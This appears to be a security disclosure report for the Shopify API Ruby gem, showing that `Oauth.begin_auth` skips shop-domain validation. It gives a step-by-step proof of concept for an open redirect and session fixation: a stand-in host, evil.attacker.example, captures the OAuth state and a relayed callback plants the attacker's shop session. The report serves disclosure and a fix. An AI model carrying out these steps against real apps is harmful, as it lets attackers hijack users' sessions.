Confirmed: `ShopValidator` is used in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`, but is **not** used anywhere in `lib/shopify_api/auth/oauth.rb` (`begin_auth` / `validate_auth_callback` / `auth_base_uri`). This confirms the gap.

### Title
Missing shop-domain validation in `Oauth.begin_auth` enables open redirect and forced OAuth completion (session fixation) - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` builds the authorization redirect URL directly from the caller-supplied `shop` string, with no validation that it is a trusted Shopify domain, unlike `ShopifyAPI::Auth::ClientCredentials.client_credentials`, `ShopifyAPI::Auth::TokenExchange.migrate_to_expiring_token`, and `ShopifyAPI::Auth::RefreshToken`, which all call `Utils::ShopValidator.sanitize!(shop)` before using the shop value to build an outgoing request host.

### Finding Description
`begin_auth` in [1](#0-0)  takes an untrusted `shop:` argument (per the gem's own docs, typically read straight from a request header/param, e.g. `shop = request.headers["Shop"]`), generates an anti-CSRF `state` nonce, sets it in a cookie, and then redirects the user's browser to `auth_base_uri(shop) + "/oauth/authorize?...&state=#{state}"`. `auth_base_uri` does nothing but interpolate the raw `shop` value into a URL: [2](#0-1) . There is no call to `Utils::ShopValidator.sanitize!` here, in contrast to every other OAuth entry point in the gem that turns a `shop` string into a request host: `ClientCredentials.client_credentials` [3](#0-2) , and `TokenExchange.migrate_to_expiring_token` [4](#0-3) .

Because `shop` is unvalidated, an attacker can call the app's login endpoint with `shop=evil.attacker.example`, causing the app to: (1) set the legitimate anti-CSRF `state` cookie in the victim's browser, then (2) 307-redirect the victim's browser to `https://evil.attacker.example/admin/oauth/authorize?...&state=<X>&redirect_uri=<the app's real, fixed callback URL>`. Because `state` is placed in the URL query string, the attacker's own server (masquerading as `/admin/oauth/authorize`) trivially reads `X` off the request.

The attacker then separately performs a completely legitimate OAuth authorization on the real Shopify platform for a shop the attacker controls (e.g., a free dev store), manually crafting the `/oauth/authorize` request with `client_id=<the target app's client_id>`, `redirect_uri=<the target app's real, fixed callback path>`, and `state=X` (the value captured from the victim). Shopify will issue a validly-signed callback (`code`, `hmac`, `shop=attacker-shop`, `state=X`) to the app's real callback endpoint. The attacker relays/sends this callback URL to the victim's browser. `validate_auth_callback` [5](#0-4)  checks the HMAC (valid, since Shopify itself signed it) and checks `state == cookie` — which now matches, because the victim's browser still holds cookie value `X` set during step 1. The OAuth flow completes and the resulting session for the **attacker's** shop gets stored/bound into the **victim's** browser/session context.

This breaks the intended binding: *the shop for which the redirect to Shopify is initiated* should equal *a shop actually controlled/trusted as a Shopify domain*, but `begin_auth` never enforces that equality, unlike the sibling OAuth entry points that do call `ShopValidator.sanitize!`.

### Impact Explanation
This is a forced OAuth completion / session-fixation attack, explicitly listed as a High-impact category. It lets an attacker plant their own shop's authenticated session into an unsuspecting victim's app session (e.g., causing the victim to perform actions in the app while believing they're interacting with their own shop, or letting the attacker observe app behavior tied to the victim's browser/cookie session), and constitutes an open redirect from the app's own login route to an arbitrary attacker-controlled host.

### Likelihood Explanation
Exploitability only requires an unprivileged internet user who can (a) get a victim to click a link starting the app's login flow with a `shop` value they control (many app integrations pass `shop` straight from the login query string, as shown in the gem's own usage docs), and (b) register a free/dev Shopify store to complete a legitimate OAuth grant for that store. No secrets, tokens, or privileged access are required.

### Recommendation
In `begin_auth` (and in `auth_base_uri`), validate and sanitize the `shop` parameter through `ShopifyAPI::Utils::ShopValidator.sanitize!` (as is already done in `ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`, and `RefreshToken`) before constructing `auth_base_uri(shop)`, rejecting any shop value that is not a trusted `*.myshopify.com`/`myshopify.io`/etc. domain.

### Proof of Concept
1. Victim visits attacker-supplied link: `https://victim-app.com/login?shop=evil.attacker.example`.
2. `ShopifyAPI::Auth::Oauth.begin_auth(shop: "evil.attacker.example", redirect_path: "/auth/callback")` is called; it sets the `state` cookie (value `X`) in the victim's browser and 307-redirects to `https://evil.attacker.example/admin/oauth/authorize?client_id=...&redirect_uri=https://victim-app.com/auth/callback&state=X`.
3. Attacker's server (`evil.attacker.example`) logs `state=X` from the incoming request.
4. Attacker, using their own real Shopify dev store, manually navigates to `https://attacker-shop.myshopify.com/admin/oauth/authorize?client_id=<victim-app's client id>&redirect_uri=https://victim-app.com/auth/callback&state=X&grant_options[]=...` and approves installation.
5. Shopify redirects to `https://victim-app.com/auth/callback?code=...&shop=attacker-shop.myshopify.com&state=X&hmac=<valid>&timestamp=...`.
6. Attacker sends this exact callback URL to the victim (or relays automatically); victim's browser (still holding cookie `state=X`) opens it.
7. `Oauth.validate_auth_callback` passes both the HMAC check and the `state == cookie` check, completing the OAuth exchange and binding the attacker's shop session into the victim's app session/cookie.

        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
